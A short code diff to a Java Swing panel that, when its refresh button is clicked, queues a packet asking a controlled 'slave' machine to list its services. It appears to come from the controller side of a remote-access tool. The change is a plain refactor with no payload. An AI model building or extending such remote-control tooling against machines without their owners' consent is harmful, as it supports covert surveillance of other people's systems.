@@ -14,7 +14,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet77ListServices;
 
 @SuppressWarnings("serial")
 public class PanelControlServices extends PanelControlParent {
@@ -36,7 +36,7 @@ public class PanelControlServices extends PanelControlParent {
 		btnRefreshList.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				clear();
-				slave.addToSendQueue(OutgoingHeader.LIST_SERVICES); 
+				slave.addToSendQueue(new Packet77ListServices()); 
 			}
 		});
 		btnRefreshList.setIcon(new ImageIcon(PanelControlServices.class.getResource("/icons/block_go.png")));
